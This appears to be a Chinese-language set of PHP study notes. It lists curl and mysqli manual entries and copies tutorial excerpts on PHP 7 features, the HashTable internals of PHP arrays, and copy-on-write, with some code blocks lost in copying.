curl_strerror — 返回错误代码的字符串描述
curl_unescape — 解码给定的 URL 编码的字符串
curl_version — 获取 cURL 版本信息
CURLFile — CURLFile 类
CURLFile::__construct — 创建 CURLFile 对象
CURLFile::getFilename — 获取被上传文件的 文件名
CURLFile::getMimeType — 获取被上传文件的 MIME 类型
CURLFile::getPostFilename — 获取 POST 请求时使用的 文件名
CURLFile::setMimeType — 设置被上传文件的 MIME 类型
CURLFile::setPostFilename — 设置 POST 请求时使用的文件名
CURLFile::__wakeup — 反序列化句柄
```

### mysqli
```
[mysql增强版](http://php.net/manual/zh/book.mysqli.php)
MySQL增强版扩展
简介
Overview
Quick start guide
Dual procedural and object-oriented interface
Connections
Executing statements
Prepared Statements
Stored Procedures
Multiple Statements
API support for transactions
Metadata
安装／配置
需求
安装
运行时配置
资源类型
mysqli 扩展和持久化连接
预定义常量
Notes
MySQLi 扩展的功能概述
MySQLi — MySQLi类
mysqli::$affected_rows — Gets the number of affected rows in a previous MySQL operation
mysqli::autocommit — 打开或关闭本次数据库连接的自动命令提交事务模式
mysqli::begin_transaction — Starts a transaction
mysqli::change_user — Changes the user of the specified database connection
mysqli::character_set_name — 返回当前数据库连接的默认字符编码
mysqli::close — 关闭先前打开的数据库连接
mysqli::commit — 提交一个事务
mysqli::$connect_errno — Returns the error code from last connect call
mysqli::$connect_error — Returns a string description of the last connect error
mysqli::__construct — Open a new connection to the MySQL server
mysqli::debug — Performs debugging operations
mysqli::dump_debug_info — 将调试信息输出到日志
mysqli::errno — 返回最近函数调用的错误代码
mysqli::$error_list — Returns a list of errors from the last command executed
mysqli::$error — Returns a string description of the last error
mysqli::$field_count — Returns the number of columns for the most recent query
mysqli::get_charset — Returns a character set object
mysqli::$client_info — 获取 MySQL 客户端信息
mysqli_get_client_version — 作为一个整数返回MySQL客户端的版本
mysqli::get_connection_stats — 返回客户端连接的统计数据
mysqli::$host_info — 返回一个表述使用的连接类型的字符串
mysqli::$protocol_version — 返回MySQL使用的协议版本号
mysqli::$server_info — 返回MySQL服务器的版本号
mysqli::$server_version — 作为一个整数返回MySQL服务器的版本
mysqli::get_warnings — Get result of SHOW WARNINGS
mysqli::$info — 返回最近执行的 SQL 语句的信息
mysqli::init — 初始化 MySQLi 并返回一个资源类型的值，这个值可以作为 mysqli_real_connect() 函数的传入参数
mysqli::$insert_id — 返回最后一条插入语句产生的自增 ID
mysqli::kill — 让服务器杀掉一个 MySQL 线程
mysqli::more_results — 检查批量查询中是否还有查询结果
mysqli::multi_query — 执行查询
mysqli::next_result — 为读取 multi_query 执行之后的下一个结果集做准备
mysqli::options — 设置选项
mysqli::ping — ping 一个连接，或者如果连接处于断开状态，重新连接
mysqli::poll — 轮询连接
mysqli::prepare — 准备执行一个 SQL 语句
mysqli::query — 对数据库执行一次查询
mysqli::real_connect — 建立一个 MySQL 服务器连接
mysqli::real_escape_string — 根据当前连接的字符集，对于 SQL 语句中的特殊字符进行转义
mysqli::real_query — 执行一个mysql查询
mysqli::reap_async_query — 获取异步查询的结果
mysqli::refresh — 刷新
mysqli::release_savepoint — 从当前事务的保存点中移除一个命名保存点
mysqli::rollback — 回退当前事务
mysqli::rpl_query_type — 返回 RPL 查询类型
mysqli::savepoint — 在当前事务中增加一个命名保存点
mysqli::select_db — 选择用于数据库查询的默认数据库
mysqli::send_query — 发送请求并返回结果
mysqli::set_charset — 设置默认字符编码
mysqli::set_local_infile_default — 取消用户指定的回调函数
mysqli::set_local_infile_handler — 设置 LOAD DATA LOCAL INFILE 命令的回调函数
mysqli::$sqlstate — 返回上一次 SQL 操作的 SQLSTATE 错误信息
mysqli::ssl_set — 使用 SSL 建立到数据库之间的安全连接
mysqli::stat — 获取当前系统状态信息
mysqli::stmt_init — 初始化一条语句并返回一个用于mysqli_stmt_prepare(调用)的对象
mysqli::store_result — 转移上一次查询返回的结果集
mysqli::$thread_id — 返回当前连接的线程 ID
mysqli::thread_safe — 返回是否是线程安全的
mysqli::use_result — Initiate a result set retrieval
mysqli::$warning_count — Returns the number of warnings from the last query for the given link
MySQLi_STMT — MySQLi_STMT类
mysqli_stmt::$affected_rows — Returns the total number of rows changed, deleted, or inserted by the last executed statement
mysqli_stmt::attr_get — Used to get the current value of a statement attribute
mysqli_stmt::attr_set — Used to modify the behavior of a prepared statement
mysqli_stmt::bind_param — Binds variables to a prepared statement as parameters
mysqli_stmt::bind_result — Binds variables to a prepared statement for result storage
mysqli_stmt::close — Closes a prepared statement
mysqli_stmt::__construct — Constructs a new mysqli_stmt object
mysqli_stmt::data_seek — Seeks to an arbitrary row in statement result set
mysqli_stmt::$errno — Returns the error code for the most recent statement call
mysqli_stmt::$error_list — Returns a list of errors from the last statement executed
mysqli_stmt::$error — Returns a string description for last statement error
mysqli_stmt::execute — Executes a prepared Query
mysqli_stmt::fetch — Fetch results from a prepared statement into the bound variables
mysqli_stmt::$field_count — Returns the number of field in the given statement
mysqli_stmt::free_result — Frees stored result memory for the given statement handle
mysqli_stmt::get_result — Gets a result set from a prepared statement
mysqli_stmt::get_warnings — Get result of SHOW WARNINGS
mysqli_stmt::$insert_id — Get the ID generated from the previous INSERT operation
mysqli_stmt::more_results — Check if there are more query results from a multiple query
mysqli_stmt::next_result — Reads the next result from a multiple query
mysqli_stmt::$num_rows — Return the number of rows in statements result set
mysqli_stmt::$param_count — Returns the number of parameter for the given statement
mysqli_stmt::prepare — Prepare an SQL statement for execution
mysqli_stmt::reset — Resets a prepared statement
mysqli_stmt::result_metadata — Returns result set metadata from a prepared statement
mysqli_stmt::send_long_data — Send data in blocks
mysqli_stmt::$sqlstate — Returns SQLSTATE error from previous statement operation
mysqli_stmt::store_result — Transfers a result set from a prepared statement
mysqli_result — mysqli_result类
mysqli_result::$current_field — Get current field offset of a result pointer
mysqli_result::data_seek — Adjusts the result pointer to an arbitrary row in the result
mysqli_result::fetch_all — Fetches all result rows as an associative array, a numeric array, or both
mysqli_result::fetch_array — Fetch a result row as an associative, a numeric array, or both
mysqli_result::fetch_assoc — Fetch a result row as an associative array
mysqli_result::fetch_field_direct — Fetch meta-data for a single field
mysqli_result::fetch_field — Returns the next field in the result set
mysqli_result::fetch_fields — Returns an array of objects representing the fields in a result set
mysqli_result::fetch_object — Returns the current row of a result set as an object
mysqli_result::fetch_row — Get a result row as an enumerated array
mysqli_result::$field_count — Get the number of fields in a result
mysqli_result::field_seek — Set result pointer to a specified field offset
mysqli_result::free — Frees the memory associated with a result
mysqli_result::$lengths — Returns the lengths of the columns of the current row in the result set
mysqli_result::$num_rows — Gets the number of rows in a result
MySQLi_Driver — MySQLi_Driver类
mysqli_driver::embedded_server_end — Stop embedded server
mysqli_driver::embedded_server_start — Initialize and start embedded server
mysqli_driver::$report_mode — Enables or disables internal report functions
MySQLi_Warning — MySQLi_Warning类
mysqli_warning::__construct — The __construct purpose
mysqli_warning::next — Fetch next warning
mysqli_sql_exception — mysqli异常类
别名和过时的 Mysqli 函数
mysqli_bind_param — mysqli_stmt_bind_param 的别名
mysqli_bind_result — mysqli_stmt_bind_result 的别名
mysqli_client_encoding — mysqli_character_set_name 的别名
mysqli_connect — 别名 mysqli::__construct
mysqli::disable_reads_from_master — 在主从服务器结构中，禁用从主机读取数据
mysqli_disable_rpl_parse — 禁用RPL解析
mysqli_enable_reads_from_master — 开启从主机读取
mysqli_enable_rpl_parse — 开启RPL解析
mysqli_escape_string — 别名 mysqli_real_escape_string
mysqli_execute — mysqli_stmt_execute 的别名
mysqli_fetch — mysqli_stmt_fetch 的别名。
mysqli_get_cache_stats — 返回客户端Zval缓存统计信息
mysqli_get_client_stats — 返回客户端进程统计信息
mysqli_get_links_stats — 返回打开和缓存的链接相关信息
mysqli_get_metadata — mysqli_stmt_result_metadata 的别名
mysqli_master_query — 在主/从机制中强制在主机中执行一个查询
mysqli_param_count — mysqli_stmt_param_count 的别名
mysqli_report — 别名 mysqli_driver->report_mode
mysqli_rpl_parse_enabled — 检查是否开启了 RPL 解析
mysqli_rpl_probe — RPL 探测
mysqli_send_long_data — mysqli_stmt_send_long_data 的别名
mysqli::set_opt — Alias of mysqli_options
mysqli_slave_query — 在主/从机制中强制在从机上执行一个查询
```

### php7
```
[php7新特性](http://www.runoob.com/w3cnote/php7-new-features.html)
PHP 7 新特性
分类 PHP 常用实例
标量类型声明
PHP 7 中的函数的形参类型声明可以是标量了。在 PHP 5 中只能是类名、接口、array 或者 callable (PHP 5.4，即可以是函数，包括匿名函数)，现在也可以使用 string、int、float和 bool 了。

<?php
// 强制模式
function sumOfInts(int ...$ints)
{
    return array_sum($ints);
}

var_dump(sumOfInts(2, '3', 4.1));
以上实例会输出：

int(9)
需要注意的是上文提到的严格模式的问题在这里同样适用：强制模式（默认，既强制类型转换）下还是会对不符合预期的参数进行强制类型转换，严格模式下则触发 TypeError 的致命错误。

返回值类型声明
PHP 7 增加了对返回类型声明的支持。 类似于参数类型声明，返回类型声明指明了函数返回值的类型。可用的类型与参数声明中可用的类型相同。

<?php

function arraysSum(array ...$arrays): array
{
    return array_map(function(array $array): int {
        return array_sum($array);
    }, $arrays);
}

print_r(arraysSum([1,2,3], [4,5,6], [7,8,9]));
以上实例会输出：

Array
(
    [0] => 6
    [1] => 15
    [2] => 24
)
NULL 合并运算符
由于日常使用中存在大量同时使用三元表达式和 isset()的情况，NULL 合并运算符使得变量存在且值不为NULL， 它就会返回自身的值，否则返回它的第二个操作数。

实例如下：

<?php
// 如果 $_GET['user'] 不存在返回 'nobody'，否则返回 $_GET['user'] 的值
$username = $_GET['user'] ?? 'nobody';
// 类似的三元运算符
$username = isset($_GET['user']) ? $_GET['user'] : 'nobody';
?>
太空船操作符（组合比较符）
太空船操作符用于比较两个表达式。当$a大于、等于或小于$b时它分别返回-1、0或1。

实例如下：

<?php
// 整型
echo 1 <=> 1; // 0
echo 1 <=> 2; // -1
echo 2 <=> 1; // 1

// 浮点型
echo 1.5 <=> 1.5; // 0
echo 1.5 <=> 2.5; // -1
echo 2.5 <=> 1.5; // 1
 
// 字符串
echo "a" <=> "a"; // 0
echo "a" <=> "b"; // -1
echo "b" <=> "a"; // 1
?>
通过 define() 定义常量数组
实例如下：

<?php
define('ANIMALS', [
    'dog',
    'cat',
    'bird'
]);

echo ANIMALS[1]; // 输出 "cat"
?>
匿名类
现在支持通过new class 来实例化一个匿名类，实例如下：

<?php
interface Logger {
    public function log(string $msg);
}

class Application {
    private $logger;

    public function getLogger(): Logger {
         return $this->logger;
    }

    public function setLogger(Logger $logger) {
         $this->logger = $logger;
    }
}

$app = new Application;
$app->setLogger(new class implements Logger {
    public function log(string $msg) {
        echo $msg;
    }
});

var_dump($app->getLogger());
?>
以上实例会输出：

object(class@anonymous)#2 (0) {
}
Unicode codepoint 转译语法
这接受一个以16进制形式的 Unicode codepoint，并打印出一个双引号或heredoc包围的 UTF-8 编码格式的字符串。 可以接受任何有效的 codepoint，并且开头的 0 是可以省略的。

echo "\u{aa}";
echo "\u{0000aa}";
echo "\u{9999}";
以上实例会输出：

ª
ª (same as before but with optional leading 0's)
香
Closure::call()
Closure::call() 现在有着更好的性能，简短干练的暂时绑定一个方法到对象上闭包并调用它。

<?php
class A {private $x = 1;}

// Pre PHP 7 代码
$getXCB = function() {return $this->x;};
$getX = $getXCB->bindTo(new A, 'A'); // intermediate closure
echo $getX();

// PHP 7+ 代码
$getX = function() {return $this->x;};
echo $getX->call(new A);
以上实例会输出：

1
1
为unserialize()提供过滤
这个特性旨在提供更安全的方式解包不可靠的数据。它通过白名单的方式来防止潜在的代码注入。

<?php

// 转换对象为 __PHP_Incomplete_Class 对象
$data = unserialize($foo, ["allowed_classes" => false]);

// 转换对象为 __PHP_Incomplete_Class 对象，除了 MyClass 和 MyClass2
$data = unserialize($foo, ["allowed_classes" => ["MyClass", "MyClass2"]);

// 默认接受所有类
$data = unserialize($foo, ["allowed_classes" => true]);
IntlChar
新增加的 IntlChar 类旨在暴露出更多的 ICU 功能。这个类自身定义了许多静态方法用于操作多字符集的 unicode 字符。

<?php
printf('%x', IntlChar::CODEPOINT_MAX);
echo IntlChar::charName('@');
var_dump(IntlChar::ispunct('!'));
以上实例会输出：

10ffff
COMMERCIAL AT
bool(true)
若要使用此类，请先安装Intl扩展

预期
预期是向后兼用并增强之前的 assert() 的方法。 它使得在生产环境中启用断言为零成本，并且提供当断言失败时抛出特定异常的能力。

<?php
ini_set('assert.exception', 1);

class CustomError extends AssertionError {}

assert(false, new CustomError('Some error message'));
?>
以上实例会输出：

Fatal error: Uncaught CustomError: Some error message
use 加强
从同一 namespace 导入的类、函数和常量现在可以通过单个 use 语句 一次性导入了。

<?php

//  PHP 7 之前版本用法
use some\namespace\ClassA;
use some\namespace\ClassB;
use some\namespace\ClassC as C;

use function some\namespace\fn_a;
use function some\namespace\fn_b;
use function some\namespace\fn_c;

use const some\namespace\ConstA;
use const some\namespace\ConstB;
use const some\namespace\ConstC;

// PHP 7+ 用法
use some\namespace\{ClassA, ClassB, ClassC as C};
use function some\namespace\{fn_a, fn_b, fn_c};
use const some\namespace\{ConstA, ConstB, ConstC};
?>
Generator 加强
增强了Generator的功能，这个可以实现很多先进的特性

<?php
<?php

function gen()
{
    yield 1;
    yield 2;

    yield from gen2();
}

function gen2()
{
    yield 3;
    yield 4;
}

foreach (gen() as $val)
{
    echo $val, PHP_EOL;
}

?>
以上实例会输出：
整除
新增了整除函数 intdiv(),使用实例：

<?php
var_dump(intdiv(10, 3));
?>
以上实例会输出：

int(3)
```

### PHP 数组底层实现 （HashTable + Linked list）
```
https://zhuanlan.zhihu.com/p/97762122
数组在 PHP 中非常强大、灵活的一种数据类型，和 Java、C 等静态语言不同，我们在初始化 PHP 数组的时候不必指定大小和存储数据的类型，在赋值的时候可以通过数字索引，也可以通过字符串索引的方式：


基于 PHP 数组的强大特性，我们可以轻易实现更加复杂的数据结构，比如栈、队列、列表、集合、字典等。PHP 数组功能之所以如此强大，得益于底层基于散列表实现。

PHP数组底层数据结构

PHP 数组底层依赖的散列表数据结构定义如下（位于 Zend/zend_types.h）：


这个散列表中有很多成员，我们挑几个比较重要的来讲讲：

arData：散列表中保存存储元素的数组，其内存是连续的，arData指向数组的起始位置；
nTableSize：数组的总容量，即可以容纳的元素数，arData 的内存大小就是根据这个值确定的，它的大小的是2的幂次方，最小为8，然后按照 8、16、32...依次递增；
nTableMask：这个值在散列函数根据 key 的哈希值映射元素的时候用到，它的值实际就是 nTableSize 的负数，即 nTableMask = -nTableSize，用位运算来表示就是 nTableMask = ~nTableSize+1；
nNumUsed、nNumOfElements：nNumUsed 是指数组当前使用的 Bucket 数，但不是数组有效元素个数，因为某个数组元素被删除后并没有立即从数组中删除，而是将其标记为 IS_UNDEF，只有在数组需要扩容时才会真正删除，nNumOfElements 则表示数组中有效的元素数量，即调用 count 函数返回值，如果没有扩容，nNumUsed 一直递增，无论是否删除元素；
nNextFreeElement：这个是给自动确定数值索引使用的，默认从 0 开始，比如 $arr[] = 200，这个时候 nNextFreeElement 值会自动加 1；
pDestructor：当删除或覆盖数组中的某个元素时，如果提供了这个函数句柄，则在删除或覆盖时调用此函数，对旧元素进行清理；
u：这个联合体结构主要用于一些辅助作用
Bucket 的结构比较简单，主要用来保存元素的 key 和 value，以及一个整型的 h（散列值，或者叫哈希值）：如果元素是数值索引，则其值就是数值索引的值；如果是字符串索引，那么其值就是 key 通过 Time33 算法计算得到的散列值，h 的值用来最终映射元素的存储位置。Bucket 的数据结构如下：




PHP 数组的基本实现

散列表主要由两部分组成：存储元素数组、散列函数。散列表的基本实现前面已经探讨过，PHP 中的数组除了具备散列表的基本特点之外，还有一个特别的地方，那就是它是有序的（与Java中的HashMap的无序有所不同）：数组中各元素的顺序和插入顺序一致。这个是怎么实现的呢？

为了实现 PHP 数组的有序性，PHP 底层的散列表在散列函数与元素数组之间加了一层映射表，这个映射表也是一个数组，大小和存储元素的数组相同，存储元素的类型为整型，用于保存元素在实际存储的有序数组中的下标 —— 元素按照先后顺序依次插入实际存储数组，然后将其数组下标按照散列函数散列出来的位置存储在新加的映射表中：


这样，就可以完成最终存储数据的有序性了。

PHP 数组底层结构中并没有显式标识这个中间映射表，而是与 arData 放到了一起，在数组初始化的时候并不仅仅分配用于存储 Bucket 的内存，还会分配相同数量的 uint32_t 大小的空间，这两块空间是一起分配的，然后将 arData 偏移到存储元素数组的位置，而这个中间映射表就可以通过 arData 向前访问到。

数组的初始化

数组的初始化主要是针对 HashTable 成员的设置，初始化时并不会立即分配 arData 的内存，插入第一个元素之后才会分配 arData 的内存。初始化操作可以通过 zend_hash_init 宏完成，最后由 _zend_hash_init_int 函数处理（该函数定义在 Zend/zend_hash.c 文件中）：




此时的 HashTable 只是设置了散列表的大小及其他成员的初始值，还无法用来存储元素。

插入数据

插入时会检查数组是否已经分配存储空间，因为初始化并没有实际分配 arData 的内存，在第一次插入时才会根据 nTableSize 的大小分配，分配以后会把 HashTable->u.flags 打上 HASH_FLAG_INITIALIZED 掩码，这样，下次插入时发现已经分配了就不会重复操作，这段检查逻辑位于 _zend_hash_add_or_update_i 函数中：

if (UNEXPECTED(!(HT_FLAGS(ht) & HASH_FLAG_INITIALIZED))) {
    zend_hash_real_init_mixed(ht);
    if (!ZSTR_IS_INTERNED(key)) {
        zend_string_addref(key);
        HT_FLAGS(ht) &= ~HASH_FLAG_STATIC_KEYS;
        zend_string_hash_val(key);
    }
    goto add_to_hash;
}
如果 arData 还没有分配，则最终由 zend_hash_real_init_mixed_ex 完成内存分配：




分配完 arData 的内存后就可以进行插入操作了，插入时先将元素按照顺序插入 arData，然后将其在 arData 数组中的位置存储到根据 key 的散列值与 nTableMask 计算得到的中间映射表中的对应位置：


上述只是最基本的插入处理，不涉及已存在数据的覆盖和清理。

哈希冲突

PHP 数组底层的散列表采用链地址法解决哈希冲突，即将冲突的 Bucket 串成链表。

HashTable 中的 Bucket 会记录与它冲突的元素在 arData 数组中的位置，这也是一个链表，冲突元素的保存位置不在 Bucket 结构中，而是保存在了存储元素 zval 的 u2 结构中，即 Bucket.val.u2.next，所以插入时分为以下两步：

// 将映射表中原来的值保存到新 Bucket 中，哈希冲突时会用到（以链表方式解决哈希冲突）
Z_NEXT(p->val) = HT_HASH_EX(arData, nIndex);
// 再把新元素数组存储位置更新到数据表中
// 保存idx：((unit32_t*))(ht->arData)[nIndex] = idx
HT_HASH_EX(arData, nIndex) = HT_IDX_TO_HASH(idx);


数组查找

清楚了 HashTable 的实现和哈希冲突的解决方式之后，查找的过程就比较简单了：首先根据 key 计算出的散列值与 nTableMask 计算得到最终散列值 nIndex，然后根据散列值从中间映射表中得到存储元素在有序存储数组中的位置 idx，接着根据 idx 从有序存储数组（即 arData）中取出 Bucket，遍历该 Bucket，判断 Bucket 的 key 是否是要查找的 key，如果是则终止遍历，否则继续根据 zval.u2.next 遍历比较。

对应的底层源码如下：


删除数据

关于数组数据删除前面我们在介绍散列表中的 nNumUsed 和 nNumOfElements 字段时已经提及过，从数组中删除元素时，并没有真正移除，并重新 rehash，而是当 arData 满了之后，才会移除无用的数据，从而提高性能。即数组在需要扩容的情况下才会真正删除元素：首先检查数组中已删除元素所占比例，如果比例达到阈值则触发重新构建索引的操作，这个过程会把已删除的 Bucket 移除，然后把后面的 Bucket 往前移动补上空位，如果还没有达到阈值则会分配一个原数组大小 2 倍的新数组，然后把原数组的元素复制到新数组上，最后重建索引，重建索引会将已删除的 Bucket 移除。

对应底层代码如下：


除此之外，数组还有很多其他操作，比如复制、合并、销毁、重置等，这些操作对应的代码都位于 zend_hash.c 中，感兴趣的同学可以去看看。

https://www.jb51.net/article/168406.htm
PHP 的数组是一种非常强大灵活的数据类型，在讲它的底层实现之前，先看一下 PHP 的数组都具有哪些特性。

可以使用数字或字符串作为数组健值

1
$arr = [1 => 'ok', 'one' => 'hello'];
可按顺序读取数组

1
2
3
foreach($arr as $key => $value){
 echo $arr[$key];
}
可随机读取数组中的元素
1
2
3
4
5
$arr = [1 => 'ok', 'one' => 'hello', 'a' => 'world'];
 
echo $arr['one'];
 
echo current($arr);
数组的长度是可变的

1
2
3
4
5
$arr = [1, 2, 3];
 
$arr[] = 4;
 
array_push($arr, 5);
正是基于这些特性，我们可以使用 PHP 中的数组轻易的实现集合、栈、列表、字典等多种数据结构。那么这些特性在底层是如何实现的呢？ 这就得从数据结构说起了。

数据结构

PHP 中的数组实际上是一个有序映射。映射是一种把 values 关联到 keys 的类型。
PHP 数组的底层实现是散列表（也叫 hashTable )，散列表是根据键（Key）直接访问内存存储位置的数据结构，它的key - value 之间存在一个映射函数，可以根据 key 通过映射函数得到的散列值直接索引到对应的 value 值，无需通过关键字比较，在理想情况下，不考虑散列冲突，散列表的查找效率是非常高的，时间复杂度是 O(1)。

从源码中我们可以看到 zend_array 的结构如下：

1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
typedef struct _zend_array zend_array;
typedef struct _zend_array hashTable;
 
struct _zend_array {
  zend_refcounted_h gc;
  union {
    struct {
      ZEND_ENDIAN_LOHI_4(
          zend_uchar  flags,
          zend_uchar  nApplyCount,
          zend_uchar  nIteratorsCount,
          zend_uchar  reserve)
    } v;
    uint32_t flags;
  } u;
  uint32_t     nTableMask; // 哈希值计算掩码，等于nTableSize的负值(nTableMask = -nTableSize)
  Bucket      *arData;   // 存储元素数组，指向第一个Bucket
  uint32_t     nNumUsed;  // 已用Bucket数（含失效的 Bucket）
  uint32_t     nNumOfElements; // 哈希表有效元素数
  uint32_t     nTableSize;   // 哈希表总大小，为2的n次方（包括无效的元素）
  uint32_t     nInternalPointer; // 内部指针，用于遍历
  zend_long     nNextFreeElement; // 下一个可用的数值索引,如:arr[] = 1;arr["a"] = 2;arr[] = 3; 则nNextFreeElement = 2;
  dtor_func_t    pDestructor;
};
该结构中的 Bucket 即储存元素的数组，arData 指向数组的起始位置，使用映射函数对 key 值进行映射后可以得到偏移值，通过内存起始位置 + 偏移值即可在散列表中进行寻址操作。

Bucket 的数据结构如下：

1
2
3
4
5
typedef struct _Bucket {
  zval       val; // 存储的具体 value，这里是一个 zval，而不是一个指针
  zend_ulong    h;  // 数字 key 或字符串 key 的哈希值。用于查找时 key 的比较  
  zend_string   *key; // 当 key 值为字符串时，指向该字符串对应的 zend_string（使用数字索引时该值为 NULL），用于查找时 key 的比较
} Bucket;
到这里有个问题出现了：存储在散列表里的元素是无序的，PHP 数组如何做到按顺序读取的呢？

答案是中间映射表，为了实现散列表的有序性，PHP 为其增加了一张中间映射表，该表是一个大小与 Bucket 相同的数组，数组中储存整形数据，用于保存元素实际储存的 Value 在 Bucekt 中的下标。Bucekt 中的数据是有序的，而中间映射表中的数据是无序的。



而通过映射函数映射后的散列值要在中间映射表的区间内，这就对映射函数提出了要求。

映射函数
PHP7 数组采用的映射方式：

1
nIndex = h | ht->nTableMask;
将 key 经过 time33 算法生成的哈希值 h 和 nTableMask 进行或运算即可得出映射表的下标，其中 nTableMask 数值为 nTableSize 的负数。并且由于 nTableSize 的值为 2 的幂次方，所以 nTableMask 二进制位右侧全部为 0，保证了 h | ht->nTableMask 的取值范围会在 [-nTableSize, -1] 之间，正好在映射表的下标范围内。另外，用按位或运算的方法和其他方法如取余的方法相比运算速度较高，这个映射函数可以说设计的非常巧妙了。

散列（哈希）冲突
不同键名的通过映射函数计算得到的散列值有可能相同，此时便发生了散列冲突。

对于散列冲突有以下 4 种常用方法：

1.将散列值放到相邻的最近地址里

2.换个散列函数重新计算散列值

3.将冲突的散列值统一放到另一个地方

4.在冲突位置构造一个单向链表，将散列值相同的元素放到相同槽位对应的链表中。这个方法叫链地址法，PHP 数组就是采用这个方法解决散列冲突的问题。

其具体实现是：将冲突的 Bucket 串成链表，这样中间映射表映射出的就不是某一个元素，而是一个 Bucket 链表，通过散列函数定位到对应的 Bucket 链表时，需要遍历链表，逐个对比 Key 值，继而找到目标元素。而每个 Bucket 之间的链接则是将原 value 的下标保存到新 value 的 zval.u2.next 里，新 value 放在当前位置上，从而形成一个单向链表。

举个例子：

当我们访问 $arr['key'] 的过程中，假设首先通过散列运算得出映射表下标为 -2 ，然后访问映射表发现其内容指向 arData 数组下标为 1 的元素。此时我们将该元素的 key 和要访问的键名相比较，发现两者并不相等，则该元素并非我们所想访问的元素，而元素的 zval.u2.next 保存的值正是另一个具有相同散列值的元素对应 arData 数组的下标，所以我们可以不断通过 zval.u2.next 的值遍历直到找到键名相同的元素。

扩容
PHP 的数组在底层实现了自动扩容机制，当插入一个元素且没有空闲空间时，就会触发自动扩容机制，扩容后再执行插入。

扩容的过程为：

如果已删除元素所占比例达到阈值，则会移除已被逻辑删除的 Bucket，然后将后面的 Bucket 向前补上空缺的 Bucket，因为 Bucket 的下标发生了变动，所以还需要更改每个元素在中间映射表中储存的实际下标值。

如果未达到阈值，PHP 则会申请一个大小是原数组两倍的新数组，并将旧数组中的数据复制到新数组中，因为数组长度发生了改变，所以 key-value 的映射关系需要重新计算，这个步骤为重建索引。

重建散列表
在删除某一个数组元素时，会先使用标志位对该元素进行逻辑删除，即在删除 value 时只是将 value 的 type 设置为 IS_UNDEF，而不会立即删除该元素所在的 Bucket，因为如果每次删除元素立刻删除 Bucket 的话，每次都需要进行排列操作，会造成不必要的性能开销。

所以，当删除元素达到一定数量或扩容后都需要重建散列表，即移除被标记为删除的 value。因为 value 在 Bucket 位置移动了或哈希数组 nTableSize 变化了导致 key 与 value 的映射关系改变，重建过程就是遍历 Bucket 数组中的 value，然后重新计算映射值更新到散列表。
```

### Copy on write 原理，何时 GC
```
https://www.jb51.net/article/50079.htm
什么是写时复制（Copy On Write）？

答：在复制一个对象的时候并不是真正的把原先的对象复制到内存的另外一个位置上，而是在新对象的内存映射表中设置一个指针，指向源对象的位置，并把那块内存的Copy-On-Write位设置为1.这样，在对新的对象执行读操作的时候，内存数据不发生任何变动，直接执行读操作；而在对新的对象执行写操作时，将真正的对象复制到新的内存地址中，并修改新对象的内存映射表指向这个新的位置，并在新的内存位置上执行写操作。

这个技术需要跟虚拟内存和分页同时使用，好处就是在执行复制操作时因为不是真正的内存复制，而只是建立了一个指针，因而大大提高效率。但这不是一直成立的，如果在复制新对象之后，大部分对象都还需要继续进行写操作会产生大量的分页错误，得不偿失。所以COW高效的情况只是在复制新对象之后，在一小部分的内存分页上进行写操作。

在PHP 内核中同样使用了写时复制机制来避免在赋值时导致内存增加，比如我们在使用foreach循环体时，可以发现其中的奥秘，示例代码：

复制代码代码如下:

$m1 = memory_get_usage();
$str=<<<EOF
aaaaaaaaaaaaaa
aaaaaaaaaaaaaa
aaaaaaaaaaaaaa
EOF;
$arr = explode("\n", $str);
$count=0;
foreach($arr as $v){
    $count++;
    //$v='aaaaaaaaaaaaaa';
}
$m2 = memory_get_usage();
echo $m2-$m1;
当我们执行此代码时会得到内存占用为：788

复制代码代码如下:

$m1 = memory_get_usage();
$str=<<<EOF
aaaaaaaaaaaaaa
aaaaaaaaaaaaaa
aaaaaaaaaaaaaa
EOF;
$arr = explode("\n", $str);
$count=0;
foreach($arr as $v){
$count++;
$v='aaaaaaaaaaaaaa';
}
$m2 = memory_get_usage();
echo $m2-$m1;
当我们取消 //$v='aaaaaaaaaaaaaa';  的注释，此时内存占用数值为：840，注意内存增长了。

复制代码代码如下:

$m1 = memory_get_usage();
$str=<<<EOF
aaaaaaaaaaaaaa
aaaaaaaaaaaaaa
aaaaaaaaaaaaaa
EOF;
$arr = explode("\n", $str);
$count=0;
foreach($arr as &$v){
$count++;
//$v='aaaaaaaaaaaaaa';
}
$m2 = memory_get_usage();
echo $m2-$m1;
当我们将foreach中的$v 改写为 &$v 时，不管是否注释循环体中对$v的注释，我们都可以得到内存占用为：788

这里就说明了COW机制的介入，当我们在foreach循环中纯粹的只用到对$v 的读操作时，PHP内核会将$v这个变量的内存地址指向到$arr中数组这一索引的内存地址，并没有将数组中的数据复制一份给到变量$v，此时内存占用情况和使用&$v 是一样的。但当我们在循环体内对$v进行写操作时，写时复制机制就被激活了，此时PHP会重新开辟一段内存空间给到$v变量，而将原先$v指向数组的内存地址给断开了，此时内存必然就会增长了。

这里可以得出另外一个结论：当我们在读取大数据的时候，要注意COW机制引入的内存增长影响，同样避免不必要的对变量写，可以提高代码运行性能。

https://segmentfault.com/a/1190000014024336
PHP写时复制（Copy On Write）
php
发布于 2018-03-27
从一个例子说起：

<?php
$foo = 1;
$bar = $foo;
echo $foo + $bar;
变量 $foo 赋值给变量 $bar，这两个变量具有相同的值，没有必要新申请内存空间，他们可以共享同一块内存。在很多场景下PHP 的 COW 对内存进行优化。比如：变量的多次赋值、函数参数传递，并在函数体内修改实参等。

什么是“复制”
这是一段摘自鸟哥博客的例子，说的比较清楚，就直接贴过来了。

<?php
   $var = "laruence";
   $var_dup = $var;
   $var = 1;
?>
很明显在这段代码执行以后，$var_dup 的值应该还是”laruence”, 那么这又是怎么实现的呢？这就是 PHP 的 copy on write 机制：

PHP 在修改一个变量以前，会首先查看这个变量的 refcount，如果 refcount 大于1，PHP 就会执行一个分离的例程， 对于上面的代码，当执行到第三行的时候，PHP 发现 $var 指向的 zval 的 refcount 大于1，那么 PHP 就会复制一个新的 zval 出来，将原 zval 的 refcount 减 1，并修改 symbol_table，使得 $var 和 $var_dup 分离(Separation)。这个机制就是所谓的 copy on write(写时复制)。

写时复制应用场景
写时复制（Copy on Write，也缩写为COW)的应用场景非常多， 比如Linux中对进程复制中内存使用的优化，在各种编程语言中，如C++的STL等等中均有类似的应用。 COW是常用的优化手段，可以归类于：资源延迟分配。只有在真正需要使用资源时才占用资源， 写时复制通常能减少资源的占用。

一个证明 PHP COW 优化内存占用的例子：

<?php
$j = 1;
var_dump(memory_get_usage());
 
$tipi = array_fill(0, 100000, 'php-internal');
